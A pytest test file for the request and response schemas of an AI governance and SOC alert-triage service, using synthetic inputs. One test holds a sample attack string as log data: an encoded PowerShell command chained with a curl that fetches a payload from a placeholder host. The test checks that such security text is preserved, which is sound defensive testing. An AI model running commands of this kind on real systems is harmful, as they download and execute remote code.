import csv
import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from app.schemas import (
    MAX_DESCRIPTION_LENGTH,
    MAX_LABEL_LENGTH,
    MAX_LIST_ENTRY_LENGTH,
    MAX_LIST_ITEMS,
    MAX_RAW_LOG_LENGTH,
    GovernanceRiskRequest,
    GovernanceRiskResponse,
    SocAlertRequest,
    SocAlertResponse,
    SourceReference,
)


GOVERNANCE_INPUT = {
    "system_name": "Synthetic policy assistant",
    "system_purpose": "Draft policy answers.",
}
SOC_INPUT = {
    "alert_id": "SYNTHETIC-001",
    "alert_type": "Authentication",
    "source_system": "Synthetic auth log",
    "affected_asset": "demo-host",
    "raw_log": "Failed authentication from 192.0.2.10",
}
GOVERNANCE_RESPONSE = {
    "system_name": "Synthetic policy assistant",
    "risk_level": "low",
    "decision": "approved",
    "summary": "Human-reviewed draft answers.",
    "key_risks": [],
    "required_controls": [],
    "human_review_requirements": [],
    "logging_requirements": [],
    "evidence_gaps": [],
    "recommended_next_steps": [],
}
SOC_RESPONSE = {
    "alert_id": "SYNTHETIC-001",
    "severity": "low",
    "likely_incident_type": "Unknown",
    "summary": "Investigation needed.",
    "mitre_mapping": [],
    "recommended_containment": [],
    "recommended_investigation_steps": [],
    "false_positive_considerations": [],
    "evidence_gaps": [],
    "analyst_note": "Verify authentication context.",
}


@pytest.mark.parametrize("risk_level", ["low", "medium", "high", "critical"])
def test_governance_risk_levels(risk_level):
    response = GovernanceRiskResponse(
        **{**GOVERNANCE_RESPONSE, "risk_level": risk_level}
    )
    assert response.risk_level == risk_level


@pytest.mark.parametrize("decision", ["approved", "needs_review", "rejected"])
def test_governance_decisions(decision):
    response = GovernanceRiskResponse(**{**GOVERNANCE_RESPONSE, "decision": decision})
    assert response.decision == decision


@pytest.mark.parametrize("severity", ["low", "medium", "high", "critical"])
def test_soc_severities(severity):
    response = SocAlertResponse(**{**SOC_RESPONSE, "severity": severity})
    assert response.severity == severity


@pytest.mark.parametrize(
    "model,payload,field",
    [
        (GovernanceRiskResponse, GOVERNANCE_RESPONSE, "risk_level"),
        (GovernanceRiskResponse, GOVERNANCE_RESPONSE, "decision"),
        (SocAlertResponse, SOC_RESPONSE, "severity"),
    ],
)
@pytest.mark.parametrize("value", ["unknown", "HIGH", "", None])
def test_invalid_response_categories(model, payload, field, value):
    with pytest.raises(ValidationError) as exc_info:
        model(**{**payload, field: value})
    assert exc_info.value.errors()[0]["loc"] == (field,)


@pytest.mark.parametrize(
    "model,payload,field,limit",
    [
        (GovernanceRiskRequest, GOVERNANCE_INPUT, "system_name", MAX_LABEL_LENGTH),
        (
            GovernanceRiskRequest,
            GOVERNANCE_INPUT,
            "system_purpose",
            MAX_DESCRIPTION_LENGTH,
        ),
        (
            GovernanceRiskRequest,
            GOVERNANCE_INPUT,
            "human_review_process",
            MAX_DESCRIPTION_LENGTH,
        ),
        (
            GovernanceRiskRequest,
            GOVERNANCE_INPUT,
            "business_impact",
            MAX_DESCRIPTION_LENGTH,
        ),
        (SocAlertRequest, SOC_INPUT, "alert_id", MAX_LABEL_LENGTH),
        (SocAlertRequest, SOC_INPUT, "alert_type", MAX_LABEL_LENGTH),
        (SocAlertRequest, SOC_INPUT, "source_system", MAX_LABEL_LENGTH),
        (SocAlertRequest, SOC_INPUT, "affected_asset", MAX_LABEL_LENGTH),
        (SocAlertRequest, SOC_INPUT, "raw_log", MAX_RAW_LOG_LENGTH),
        (SocAlertRequest, SOC_INPUT, "observed_behavior", MAX_DESCRIPTION_LENGTH),
    ],
)
def test_request_string_limits(model, payload, field, limit):
    assert getattr(model(**{**payload, field: "x" * limit}), field) == "x" * limit
    with pytest.raises(ValidationError) as exc_info:
        model(**{**payload, field: "x" * (limit + 1)})
    assert exc_info.value.errors()[0]["loc"] == (field,)


@pytest.mark.parametrize(
    "model,payload,field",
    [
        (GovernanceRiskRequest, GOVERNANCE_INPUT, "data_types"),
        (GovernanceRiskRequest, GOVERNANCE_INPUT, "users"),
        (GovernanceRiskRequest, GOVERNANCE_INPUT, "external_integrations"),
        (SocAlertRequest, SOC_INPUT, "known_indicators"),
    ],
)
def test_request_list_limits(model, payload, field):
    entries = ["x" * MAX_LIST_ENTRY_LENGTH] * MAX_LIST_ITEMS
    assert getattr(model(**{**payload, field: entries}), field) == entries
    with pytest.raises(ValidationError) as exc_info:
        model(**{**payload, field: entries + ["extra"]})
    assert exc_info.value.errors()[0]["loc"] == (field,)
    with pytest.raises(ValidationError) as exc_info:
        model(**{**payload, field: ["x" * (MAX_LIST_ENTRY_LENGTH + 1)]})
    assert exc_info.value.errors()[0]["loc"] == (field, 0)


def test_soc_security_text_is_preserved():
    text = "powershell -EncodedCommand U1lOVEhFVElD; curl https://example.invalid/payload; 192.0.2.10"
    request = SocAlertRequest(
        **{**SOC_INPUT, "raw_log": text, "known_indicators": [text]}
    )
    assert request.raw_log == text
    assert request.known_indicators == [text]


def test_synthetic_sample_files_validate():
    sample_dir = Path(__file__).resolve().parents[1] / "sample_data"
    governance = json.loads(
        (sample_dir / "ai_use_cases.json").read_text(encoding="utf-8")
    )
    assert len(governance) == 2
    for payload in governance:
        GovernanceRiskRequest.model_validate(payload)
    with (sample_dir / "soc_alerts.csv").open(encoding="utf-8", newline="") as file:
        alerts = list(csv.DictReader(file))
    assert len(alerts) == 3
    for payload in alerts:
        payload["known_indicators"] = json.loads(payload["known_indicators"])
        SocAlertRequest.model_validate(payload)


def test_source_reference_schema():
    source = SourceReference(
        source_id="SOC-BRUTE-FORCE-SUCCESS",
        title="SOC Checklist - Brute Force Followed by Successful Login",
        framework="Local SOC Checklist",
        relevance="Matched the alert pattern of failed logins followed by success.",
    )

    assert source.source_id == "SOC-BRUTE-FORCE-SUCCESS"
    assert source.framework == "Local SOC Checklist"


def test_governance_request_schema():
    request = GovernanceRiskRequest(
        system_name="Internal HR Policy Chatbot",
        system_purpose="Answer employee HR policy questions.",
    )

    assert request.system_name == "Internal HR Policy Chatbot"
    assert request.data_types == []


def test_soc_alert_request_schema():
    request = SocAlertRequest(
        alert_id="SOC-001",
        alert_type="SSH brute force",
        source_system="Linux auth logs",
        affected_asset="ubuntu-web-01",
        raw_log="Multiple failed SSH logins.",
    )

    assert request.alert_id == "SOC-001"
    assert request.known_indicators == []


def test_governance_response_supports_source_references():
    response = GovernanceRiskResponse(
        system_name="Internal Resume Screening Assistant",
        risk_level="high",
        decision="needs_review",
        summary="High-impact AI use case requiring governance review.",
        key_risks=["Bias in candidate ranking"],
        required_controls=["Human review of rankings"],
        human_review_requirements=["Recruiter validates recommendations"],
        logging_requirements=["Log recommendations and reviewer actions"],
        evidence_gaps=["No bias testing method provided"],
        recommended_next_steps=["Conduct AI governance review"],
        source_references=[
            SourceReference(
                source_id="GRC-HIGH-IMPACT-USE",
                title="AI Governance Checklist - High-Impact Use",
                framework="Local AI Governance Checklist",
                relevance="The system affects hiring decisions.",
            )
        ],
    )

    assert response.source_references
    assert response.source_references[0].source_id == "GRC-HIGH-IMPACT-USE"


def test_soc_response_supports_source_references():
    response = SocAlertResponse(
        alert_id="SOC-001",
        severity="high",
        likely_incident_type="Possible credential compromise",
        summary="Failed SSH logins were followed by successful admin authentication.",
        mitre_mapping=["Credential Access", "Initial Access"],
        recommended_containment=["Consider disabling the account pending verification"],
        recommended_investigation_steps=["Review authentication history"],
        false_positive_considerations=["Legitimate admin maintenance activity"],
        evidence_gaps=["No MFA context provided"],
        analyst_note="Verify whether the successful admin login was expected.",
        source_references=[
            SourceReference(
                source_id="SOC-BRUTE-FORCE-SUCCESS",
                title="SOC Checklist - Brute Force Followed by Successful Login",
                framework="Local SOC Checklist",
                relevance="The alert matches failed logins followed by successful authentication.",
            )
        ],
    )

    assert response.source_references
    assert response.source_references[0].source_id == "SOC-BRUTE-FORCE-SUCCESS"
